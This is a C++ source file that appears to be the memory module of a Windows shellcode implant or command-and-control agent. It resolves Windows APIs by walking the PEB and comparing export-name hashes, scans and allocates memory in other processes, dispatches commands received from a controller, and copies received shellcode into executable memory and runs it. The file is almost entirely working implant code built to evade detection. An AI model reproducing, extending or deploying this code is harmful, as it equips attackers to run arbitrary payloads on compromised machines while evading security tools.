#include <core/include/memory.hpp>

void* operator new(size_t size) {

    void *ptr = nullptr;
    if (Ctx->heap && Ctx->nt.RtlAllocateHeap) {
        ptr = Ctx->nt.RtlAllocateHeap(Ctx->heap, 0, size);

        if (!ptr) {
            NtCurrentTeb()->LastErrorValue = ERROR_NOT_ENOUGH_MEMORY;
        }
    }

    return ptr;
}

void operator delete(void* ptr) noexcept {

    if (Ctx->heap && Ctx->nt.RtlFreeHeap && ptr) {
        if (!Ctx->nt.RtlFreeHeap(Ctx->heap, 0, ptr)) {
            NtCurrentTeb()->LastErrorValue = ERROR_INVALID_PARAMETER;
        }
    }
}

void* operator new[](size_t size) {
    return operator new(size);
}

void operator delete[](void* ptr) noexcept {
    operator delete(ptr);
}


namespace Memory {
    namespace Methods {

        UINT_PTR GetStackCookie() {

            uintptr_t cookie = 0;
            x_ntassert(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr));

            defer:
            return cookie;
        }

        _resource* GetIntResource(HMODULE base, const int rsrc_id) {

            HRSRC       res_info    = { };
            _resource   *object     = (_resource*)  x_malloc(sizeof(_resource));

            x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
            x_assert(object->size      = Ctx->win32.SizeofResource(base, res_info));
            x_assert(object->res_lock  = Ctx->win32.LockResource(object->h_global));

        defer:
            return object;
        }

        _executable* CreateImageData(uint8_t *data) {

            _executable *image = (_executable*) x_malloc(sizeof(_executable));

            image->buffer   = data;
            image->dos_head = DOS_HEADER(image->buffer);
            image->nt_head  = NT_HEADERS(image->buffer, image->dos_head);
            image->exports  = EXPORT_DIRECTORY(image->dos_head, image->nt_head);

            return image;
        }
    }

    namespace Context {

        VOID ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance    = { };
            void    *region     = { };

            instance.teb    = NtCurrentTeb();
            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            x_assert(instance.modules.ntdll = M_PTR(NTDLL));
            x_assert(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP));

            region = RVA(PBYTE, instance.base.address, &__instance);
            x_assert(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)));

            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
            x_memset(&instance, 0, sizeof(_hexane));
            x_memset(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);

        defer:
        }

        VOID ContextDestroy() {
            // todo: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = Ctx->nt.RtlFreeHeap;
            auto heap = Ctx->heap;

            x_memset(Ctx, 0, sizeof(_hexane));

            if (free) {
                free(heap, 0, Ctx);
            }
        }
    }


    namespace Modules {

        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
            return (HMODULE) data->DllBase;
        }

        LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {

            const auto head = (LIST_ENTRY*) &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

            for (auto next = head->Flink; next != head; next = next->Flink) {
                wchar_t lowercase[MAX_PATH] = { };

                const auto mod  = (LDR_DATA_TABLE_ENTRY*) B_PTR(next) - sizeof(uint32_t) * 4;
                const auto name = mod->BaseDllName;

                if (hash - Utils::HashStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
                    return mod;
                }
            }

            return nullptr;
        }

        FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {

            FARPROC address             = { };
            char    lowercase[MAX_PATH] = { };

            const auto dos_head = DOS_HEADER(base);
            const auto nt_head  = NT_HEADERS(base, dos_head);
            const auto exports  = EXPORT_DIRECTORY(dos_head, nt_head);

            if (exports->AddressOfNames) {
                const auto ords     = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
                const auto funcs    = RVA(uint32_t*, base, exports->AddressOfFunctions);
                const auto names    = RVA(uint32_t*, base, exports->AddressOfNames);

                for (auto name_index = 0; name_index < exports->NumberOfNames; name_index++) {
                    const auto name = RVA(char*, base, names[name_index]);

                    x_memset(lowercase, 0, MAX_PATH);

                    if (hash - Utils::HashStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
                        address = (FARPROC) RVA(PULONG, base, funcs[ords[name_index]]);
                        break;
                    }
                }
            }

            return address;
        }

        UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {

            uintptr_t   symbol = 0;
            int         reload = 0;

            const auto mod_hash = Utils::HashStringA(module_name, x_strlen(module_name));
            const auto fn_hash  = Utils::HashStringA(export_name, x_strlen(export_name));

            while (!symbol) {
                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
                    if (reload || !Ctx->win32.LoadLibraryA((const char*) module_name)) {
                        goto defer;
                    }

                    reload = 1;
                }
            }

            defer:
            return symbol;
        }
    }

    namespace Scanners {

        BOOL MapScan(_hash_map* map, uint32_t id, void** pointer) {

            for (auto i = 0;; i++) {
                if (!map[i].name) { break; }

                if (id == map[i].name) {
                    *pointer = map[i].address;
                    return true;
                }
            }

            return false;
        }

        BOOL SymbolScan(const char* string, const char symbol, size_t length) {

            for (auto i = 0; i < length - 1; i++) {
                if (string[i] == symbol) {
                    return true;
                }
            }

            return false;
        }

        UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {

            uintptr_t   ret     = 0;
            const auto  address = (uintptr_t) target;

            for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                    ret = 0;
                }
            }

            return ret;
        }

        BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {

            while (*mask && ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return false;
                }
            }
            return (*mask == 0x00);
        }

        UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {

            size_t      read    = 0;
            uintptr_t   address = 0;

            auto buffer = (uint8_t*) x_malloc(size);
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));

            for (auto i = 0; i < size; i++) {
                if (SigCompare(buffer + i, signature, mask)) {
                    address = start + i;
                    break;
                }
            }

            x_memset(buffer, 0, size);

        defer:
            if (buffer) { x_free(buffer); }
            return address;
        }
    }

    namespace Execute {

        BOOL ExecuteCommand(_parser &parser) {

            _command    cmd         = { };
            uintptr_t   command     = { };

            const auto  cmd_id      = Parser::UnpackDword(&parser);
            bool        success     = true;

            if (cmd_id == NOJOB) {
                goto defer;
            }

            x_assertb(command = Memory::Methods::GetInternalAddress(cmd_id));

            cmd = (_command) RVA(PBYTE, Ctx->base.address, command);
            cmd(&parser);

        defer:
            return success;
        }

        BOOL ExecuteShellcode(const _parser &parser) {

            void    (*exec)()   = { };
            void    *address    = { };

            size_t  size        = parser.Length;
            bool    success     = true;

            x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

            x_memcpy(address, parser.buffer, parser.Length);
            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));

            exec = (void(*)()) address;
            exec();

            x_memset(address, 0, size);

        defer:
            if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
            return success;
        }

    }
}
